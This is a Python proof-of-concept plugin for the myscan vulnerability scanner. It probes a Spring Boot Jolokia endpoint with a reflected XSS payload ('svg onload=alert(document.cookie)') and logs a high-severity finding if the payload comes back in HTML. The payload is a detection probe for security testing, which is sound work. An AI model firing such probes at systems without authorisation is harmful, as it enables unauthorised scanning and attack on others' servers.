# !/usr/bin/env python3
# @Time    : 2020/9/1
# @Author  : caicai
# @File    : poc_spring_xss_2020.py

from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "springboot-xss"
        self.vulmsg = "unknown source. "
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        req = {
            "method": "GET",
            "url": self.url + "jolokia/read%3Csvg%20onload=alert(document.cookie)%3E?mimeType=text/html",
            "headers": {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169"
            },
            "allow_redirects": False,
            "timeout": 10,
            "verify": False,
        }
        r = request(**req)
        if r != None and b"name 'read<svg onload=alert(document.cookie)>' exists" in r.content and "html" in r.headers.get("Content-Type",""):
            parser_ = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": parser_.geturl(),
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }
            })
